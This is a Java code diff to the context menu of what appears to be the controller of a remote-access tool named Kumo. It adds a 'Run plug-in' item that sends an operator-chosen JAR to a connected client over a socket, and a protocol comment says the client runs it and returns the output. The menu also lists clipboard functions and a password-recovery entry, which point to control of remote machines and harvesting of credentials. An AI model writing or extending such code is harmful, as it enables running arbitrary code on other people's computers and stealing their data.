@@ -146,6 +146,53 @@ class IPContextMenu implements Repository {
             });
         });
 
+        MenuItem si8 = new MenuItem("Run plug-in");
+        si8.setOnAction(event -> {
+            // Get the jar the user wants to run
+            FileChooser fileChooser = new FileChooser();
+            fileChooser.getExtensionFilters().add(new FileChooser.ExtensionFilter("Runnable JAR file", "*.jar"));
+            fileChooser.setTitle("Select plug-in");
+            File selectedDirectory = fileChooser.showOpenDialog(Kumo.getPrimaryStage());
+            String fileLocation = selectedDirectory.getAbsolutePath();
+
+            File pluginFile = new File(fileLocation);
+
+            // Send the file to client
+            /*
+            Proto:
+            SERVER: PLUGIN
+            SERVER: fbytes[n..-1] -> client
+            CLIENT: PLUGOUT
+            CLIENT: stdout from running plugin
+             */
+            if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
+                try {
+                    clientObject.clientCommunicate("PLUGIN");
+                    Long length = pluginFile.length();
+                    DataOutputStream dos = new DataOutputStream(clientObject.getClient().getOutputStream());
+                    dos.writeLong(length);
+                    FileInputStream fis = new FileInputStream(pluginFile);
+                    BufferedInputStream bs = new BufferedInputStream(fis);
+
+                    int fbyte;
+                    while ((fbyte = bs.read()) != -1) dos.writeInt(fbyte);
+                    bs.close();
+                    fis.close();
+                    Logger.log(Level.INFO, "New client binary send to " + clientObject.getIP());
+                } catch (IOException e1) {
+                    new AlertView().showErrorAlert("Unable to communicate with client.");
+                }
+            }
+
+            // GUI initialization
+            Stage stage = new Stage();
+            stage.initStyle(StageStyle.UNDECORATED);
+            stage.setMinHeight(300);
+            stage.setMinWidth(300);
+            stage.setScene(new Scene(new PluginView().getPluginViewView(stage), 400, 400));
+            stage.show();
+        });
+
         // Clipboard junk
         Menu clip = new Menu("Clipboard Functions \u25B6");
         MenuItem setClipboard = new MenuItem("Set Clipboard");
@@ -315,7 +362,7 @@ class IPContextMenu implements Repository {
             }
         });
 
-        mi1.getItems().addAll(sb1, sb2, si4, si5, si6, si7, clip, pwdRecovery, misc, update);
+        mi1.getItems().addAll(sb1, sb2, si4, si5, si6, si7, si8, clip, pwdRecovery, misc, update);
         MenuItem mi2 = new MenuItem("Copy IP");
         mi2.setOnAction(event -> {
             final Clipboard clipboard = Clipboard.getSystemClipboard();
